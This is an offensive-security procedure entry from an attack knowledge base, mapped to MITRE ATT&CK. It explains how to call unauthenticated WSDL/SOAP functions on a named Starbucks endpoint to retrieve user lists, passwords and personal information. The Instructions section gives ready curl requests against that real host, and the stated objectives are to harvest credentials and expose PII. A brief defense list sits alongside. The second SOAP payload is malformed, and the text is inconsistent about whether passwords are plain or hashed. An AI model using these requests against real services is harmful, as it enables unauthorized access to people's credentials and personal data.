---
id: proc-access-unauth-wsdl
tags:
  - unauthenticated-access
  - data-exposure
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:15:10.094Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Access Unauthenticated WSDL Functions

## Summary

This procedure exploits lack of authentication in WSDL-exposed SOAP functions to retrieve sensitive data, such as user credentials and personal information from a test database.

## Description

Targeting the Starbucks API service, unauthenticated calls to functions like user listing allow direct access to test data, including passwords and PII. This occurs due to missing auth controls on the endpoint, providing initial foothold for further attacks like SQL injection.

## Requirements

1. Access to the WSDL-discovered endpoint
2. SOAP client (e.g., Postman or soapUI)
3. No credentials needed

## Defense

Defensive measures and detection strategies:

- Implement authentication (e.g., API keys or OAuth) on all web services
- Remove or disable test endpoints in production
- Log and alert on anomalous data queries

## Objectives

1. Retrieve user lists and passwords
2. Expose personal information
3. Validate lack of access controls

## Instructions

### Step 1: Invoke User Listing Function

**Context**: Call the SOAP function for listing users without auth headers.

**Command** (SOAP request via curl):
```bash
curl -X POST http://starbucks.com.cn:nonstandardport/service -H "Content-Type: text/xml" -d '<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><ListUsers xmlns="http://example.com/service"/></soap:Body></soap:Envelope>'
```

> Expected output: XML response with user data array.

### Step 2: Extract Passwords and PII

**Context**: Target functions for password or info retrieval.

**Command** (Similar SOAP call):
```bash
curl -X POST http://starbucks.com.cn:nonstandardport/service -H "Content-Type: text/xml" -d '<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetUserInfo xmlns="http://example.com/service"><userId>1</userId></soap:Body></soap:Envelope>'
```

> Expected output: Details including hashed passwords and personal info.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[unauthenticated-access]]
- [[data-exposure]]
